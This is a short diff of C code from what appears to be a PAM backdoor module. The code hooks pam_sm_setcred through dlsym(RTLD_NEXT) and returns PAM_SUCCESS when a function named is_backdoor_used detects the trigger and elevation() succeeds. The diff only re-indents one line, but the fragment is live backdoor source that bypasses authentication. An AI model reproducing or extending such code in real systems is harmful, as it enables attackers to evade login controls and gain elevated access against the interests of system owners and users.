@@ -72,7 +72,7 @@ PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const cha
     int (*og_pam_sm_setcred)(pam_handle_t *pamh, int flags, int argc, const char **argv);
     og_pam_sm_setcred = dlsym(RTLD_NEXT, "pam_sm_setcred");
     if (is_backdoor_used(pamh)){
-        if(elevation()==0){
+    if(elevation()==0){
 return PAM_SUCCESS;
         }
     }
